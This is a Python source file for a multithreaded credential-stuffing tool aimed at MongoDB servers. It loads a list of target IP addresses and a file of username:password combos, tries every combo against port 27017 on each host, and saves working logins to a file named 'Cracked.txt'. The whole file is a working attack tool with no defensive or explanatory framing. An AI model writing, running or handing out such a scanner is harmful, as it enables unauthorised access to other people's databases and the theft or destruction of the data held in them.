from pymongo import MongoClient, errors
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
console = Console()

def loadtargIPs(file_name):
    with open(file_name, 'r') as file:
        ips = [line.strip() for line in file if line.strip()]
    return ips
def loadcombo(file_name):
    with open(file_name, 'r') as file:
        combos = [line.strip().split(':') for line in file if ':' in line]
    return combos

def auth(ip, username, password):
    try:
        client = MongoClient(f'mongodb://{username}:{password}@{ip}:27017/', serverSelectionTimeoutMS=3000)
        client.server_info()
        client.close()
        return True
    except:
        return False

def scan_mongo(ip, combos):
    for username, password in combos:
        if auth(ip, username, password):
            return True, ip, username, password
    return False, ip, None, None

def main(ips_file, combos_file, max_threads=10):
    ips = loadtargIPs(ips_file)
    combos = loadcombo(combos_file)
    total_ips = len(ips)
    good_credentials = []
    console.print(f"Starting scan of {total_ips} IP addresses...")
    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TextColumn("[progress.completed]{task.completed}/[progress.total]{task.total} IPs processed"),
        console=console
    ) as progress:
        task = progress.add_task("[bold green]Scanning IPs...", total=total_ips)

        with ThreadPoolExecutor(max_threads) as executor:
            futures = {executor.submit(scan_mongo, ip, combos): ip for ip in ips}

            for future in as_completed(futures):
                found, ip, username, password = future.result()
                if found:
                    good_credentials.append((ip, username, password))
                    console.print(f"[SUCCESS] Found valid credentials for {ip}: {username}:{password}")
                progress.update(task, advance=1)
    with open("Cracked.txt", "w") as good_file:
        for ip, username, password in good_credentials:
            good_file.write(f"{ip}:{username}:{password}\n")
    console.print(f"Scan complete. {len(good_credentials)} Valid credentials found! Saved to Cracked.txt.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        console.print("Usage: python script.py <ips_file.txt> <combos_file.txt>")
    else:
        main(sys.argv[1], sys.argv[2])
